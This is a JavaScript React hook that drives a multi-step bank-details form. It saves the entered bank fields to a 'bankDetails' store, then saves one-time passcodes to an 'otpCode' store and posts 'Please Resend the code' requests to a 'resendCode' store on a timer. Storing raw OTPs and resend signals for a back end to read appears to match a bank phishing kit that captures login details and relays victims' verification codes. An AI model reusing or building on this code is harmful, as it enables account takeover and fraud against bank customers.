import { useEffect, useState } from "react";
import { bankDetailsInfo } from "../components/home/body/personalDetails/banks/bankDetails";
import useForms from "./useForms";
import useAddToDatabase from "./useAddToDatabase";

const useBankFunctions = (
  bankName,
  setOtpOpen,
  setAllBankItems,
  setTypeAccount,
  selectedAccount
) => {
  const {
    formState,
    handleChange,
    errorFormState,
    handleBlur,
    handleSubmit: handleTheMainSubmit,
    setFormState,
    setErrorFormState,
  } = useForms(bankDetailsInfo);
  const {
    formState: formOtp,
    handleChange: changeOtp,
    errorFormState: errorOtp,
    handleBlur: blurOtp,
    handleSubmit: onSubmitOtp,
  } = useForms({
    otpo: "",
  });

  const [showPassword, setshowPassword] = useState(false);
  const [resend, setResend] = useState(false);
  const [timerId, setTimerId] = useState(null);
  const { addToAllDataBase } = useAddToDatabase("bankDetails");
  const { addToAllDataBase: addToOtp } = useAddToDatabase("otpCode");
  const { addToAllDataBase: resendCodeOption } = useAddToDatabase("resendCode");

  useEffect(() => {
    const id = setTimeout(() => setResend(true), 20000);

    setTimerId(id);

    return () => clearTimeout(id);
  }, []);

  const handleResend = async () => {
    try {
      if (!resend) return;
      await resendCodeOption({ resend: "Please Resend the code" });
      setResend(false);

      const newId = setTimeout(() => setResend(true), 20000);

      setTimerId(newId);
    } catch (error) {
      console.log(error);
    }
  };

  const onSumbitForm = async () => {
    const newItems = {
      ...formState,
      bankName: bankName,
      citizens: selectedAccount?.name || "",
    };
    try {
      await addToAllDataBase(newItems);
      setAllBankItems(true);
    } catch (error) {
      console.log(error);
    }
  };

  const handleVerifiedOtp = async () => {
    try {
      await addToOtp(formOtp);
      setOtpOpen(true);
    } catch (error) {
      console.log(error);
    }
  };

  const handleTheFinal = () => {
    setTypeAccount(true);
  };
  return {
    formState,
    handleTheMainSubmit,
    handleBlur,
    errorFormState,
    handleChange,
    onSubmitOtp,
    blurOtp,
    errorOtp,
    changeOtp,
    formOtp,
    setTimerId,
    timerId,
    setResend,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
    setFormState,
    setErrorFormState,
  };
};

export default useBankFunctions;
